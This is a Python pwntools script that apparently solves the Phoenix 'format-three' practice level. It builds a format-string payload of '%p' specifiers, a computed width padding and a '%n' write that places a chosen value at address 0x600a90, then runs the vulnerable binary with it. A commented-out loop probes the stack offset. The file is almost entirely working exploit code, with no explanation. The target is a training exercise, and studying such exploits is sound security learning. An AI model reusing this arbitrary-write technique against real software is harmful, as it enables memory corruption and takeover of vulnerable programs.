from pwn import *


def pad(s, slen, pad_char):
    return s+pad_char*(slen-len(s))


def remove_padding(s,delimiter):
    return s.split(delimiter)[0]


def utf8(s):
    return str(s, encoding="utf-8")


# 18 -> 24
# 18 % 8
def pad_8(s,pad_char):
    amount_padding_bytes = (8 - (len(s) % 8))
    print("format string to be padded: " + utf8(s))
    print("amount chars to be padded: " + str(amount_padding_bytes))
    # "20"  -> 7 dran
    # 20 42 42 42 42 42 42 42
    res = s+(amount_padding_bytes*pad_char)
    return res
    # print("padded result = " + utf8(res))
    # # 8 - (15 % 8) = 1
    # amount_padding_bytes = (8 - ((len(res)+amount_padding_bytes) % 8))
    # final = res+(amount_padding_bytes*pad_char)
    # print("format string to be padded: " + utf8(res))
    # print("amount chars to be padded: " + str(amount_padding_bytes))
    # print("padded result = " + utf8(final))
    # return final
    # # 20 42 42 42 42 42 42 42 42


def run(level, payload):
    write("/tmp/docgil", payload)
    print("payload: ")
    print(remove_padding(read("/tmp/docgil"), b"AAA"))
    io = process("cat /tmp/docgil  | /opt/phoenix/amd64/"+level, shell=True)
    return io.recvall()


def run_with_arg(level, arg):
    write("/tmp/docgil", arg)
    print("payload: ")
    print(remove_padding(read("/tmp/docgil"), b"AAA"))
    io = process("/opt/phoenix/amd64/"+level+" \"`cat /tmp/docgil`\"", shell=True)
    return io.recvall()


adr = pack(0x600a90, 64)

print(adr)


def pad_with_adr(s):
    return s+adr*(((int)(256/8))-len(s))


# # find amount %p's
# for i in range(0, 30):
#     payload = b""
#     print("index: " + str(i))
#     payload += b"%p "
#     # payload += b"\x00\x60\x0a\x90"[::-1]
#     payload += adr
#     payload += b"%p "*i
#     # payload += b"%n"
#     payload = pad(payload, 4096, b"A")
#     r = run("format-three", payload)
#     print(r)

target_value = 1682274373

payload = b""
# found out via try and error
format_payload = b""
format_payload += b"%p "*19

amount_preceeding_bytes = 19 + (20 * 8) + 90
offset = target_value - amount_preceeding_bytes
format_padding = "%"+str(offset)+"x"
format_padding = bytes(format_padding, "utf-8")
format_payload += format_padding
format_payload += b"%n "

format_payload = pad_8(format_payload, b"B")
payload += format_payload
# need to put adr behind format specifiers for some reason
# payload += adr
payload += b"\x60\x0a\x90"[::-1]
# payload = pad(payload, 4096, b"A")
r = run("format-three", payload)
print(r)


# found = r.find(b"Well")
# if found >= 0:
#     print(r)
#     break
